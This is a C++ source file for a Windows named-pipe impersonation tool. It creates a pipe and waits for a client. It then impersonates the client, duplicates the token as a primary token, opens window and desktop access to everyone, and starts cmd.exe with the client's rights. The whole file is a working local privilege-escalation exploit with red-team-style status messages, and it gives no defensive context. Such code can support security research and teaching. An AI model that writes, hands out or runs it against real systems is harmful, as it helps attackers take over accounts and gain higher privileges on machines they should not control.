#include <Windows.h>
#include <iostream>
#include "..\CPP-Util\Token.cpp"
#include "..\CPP-Util\Access.cpp"

using namespace std;
BOOL executeProcess(HANDLE hProcessToken) {
	STARTUPINFO	si = {};
	PROCESS_INFORMATION pi = {};
	BOOL bSuccess;
	wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";
	// Launch process
	wprintf(L"[*] Trying to launch %s...", command);
	bSuccess = CreateProcessWithTokenW(hProcessToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (bSuccess) wprintf(L"Success.\n");
	else wprintf(L"Error: %d.\n", GetLastError());
	
	return bSuccess;
}

BOOL impersonate_client(HANDLE hServerPipe) {
	BOOL bSuccess;
	HANDLE hToken = INVALID_HANDLE_VALUE;
	HANDLE hDuppedToken = INVALID_HANDLE_VALUE;
	wprintf(L"[*] Trying to impersonate client...");
	if (ImpersonateNamedPipeClient(hServerPipe)) {
		wprintf(L"Success.\n");
		// Open current thread token
		wprintf(L"[*] Trying to open Thread token...");
		bSuccess = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
		if (bSuccess) wprintf(L"Success.\n");
		else wprintf(L"Error: %d.\n", GetLastError());
		// Reverting back to self
		wprintf(L"[*] Reverting back to server thread context...");
		bSuccess = RevertToSelf();
		if (bSuccess) wprintf(L"Success.\n");
		else wprintf(L"Error: %d.\n", GetLastError());
		ExtractTokenInformation(hToken);
		// Duplicate Token
		wprintf(L"[*] Trying to duplicate impersonated token...");
		bSuccess = DuplicateTokenEx(hToken,
			TOKEN_ALL_ACCESS,
			NULL,
			SecurityImpersonation,
			TokenPrimary,
			&hDuppedToken);
		if (bSuccess) wprintf(L"Success!\n");
		else wprintf(L"Error: %d.\n", GetLastError());
		ExtractTokenInformation(hDuppedToken);

		// set required Window Access
		wprintf(L"[!] Setting Generic Allow-ALL Window & Desktop access rights. Be sure to revert this");
		setWindowAccess();
		setDesktopAccess();
		
		// Exuecute process
		bSuccess = executeProcess(hDuppedToken);
		// Close Handles
		CloseHandle(hToken);
		CloseHandle(hDuppedToken);
	}
	else wprintf(L"Error: %d.\n", GetLastError());
	return bSuccess;
}

int main()
{
	LPCWSTR pwsPipePrefix = L"\\\\.\\pipe\\";
	LPCWSTR pwsPipeName = NULL;
	HANDLE hServerPipe;
	BOOL bSuccess;
	DWORD bytesWritten = 0;
	DWORD messageLenght;
	BOOL bAttemptImpersonation = TRUE;
	
	// Read name pipe name to from STDIN
	wchar_t wcInputPipeName[200];
	wprintf(L"[*] Pipe name to connect to (max 200 chars): ");
	std::wcin.getline(wcInputPipeName, 200);
	int iInputLen = wcslen(wcInputPipeName);
	if (iInputLen > 200) {
		wprintf(L"[-] More than 200 chars (%d).. exiting.\n", iInputLen);
		return 1;
	}
	std::wstring wsConcat = pwsPipePrefix + (std::wstring)wcInputPipeName;
	pwsPipeName = wsConcat.c_str();
	wprintf(L"[*] Creating named pipe: %ls\n", pwsPipeName);
	hServerPipe = CreateNamedPipe(
		pwsPipeName,			// name of our pipe, must be in the form of \\.\pipe\<NAME>
		PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, // open mode, specifying a duplex pipe so server and client can send and receive data
		PIPE_TYPE_MESSAGE,	// MESSAGE mode to send/receive messages in discrete units (instead of a byte stream)
		PIPE_UNLIMITED_INSTANCES,					// number of instanced for this pipe, 1 is enough for our use case
		2048,				// output buffer size
		2048,				// input buffer size
		0,					// default timeout value, equal to 50 milliseconds
		NULL				// use default security attributes
	);
	
	wprintf(L"[*] Waiting for incoming connections...");
	bSuccess = ConnectNamedPipe(hServerPipe, NULL);
	if (bSuccess) {
		wprintf(L"Got one.\n");
	}
	else wprintf(L"Error: %d", GetLastError());
	
	// Sending a message
	wchar_t message[] = L"Gooooooooooooood Morning Vietnam...";
	messageLenght = lstrlen(message) * 2;
	wprintf(L"[*] Sending message '%s'...", message);
	bSuccess = WriteFile(hServerPipe, message, messageLenght, &bytesWritten, NULL);
	if (!bSuccess) {
		wprintf(L"Error writing to pipe. Error: %d", GetLastError());
	}
	else wprintf(L"Done.\n");
	// Attempt Impersonation if enabled
	if (bAttemptImpersonation) {
		impersonate_client(hServerPipe);
	}

	// Close handle
	CloseHandle(hServerPipe);
	
	return 0;
}
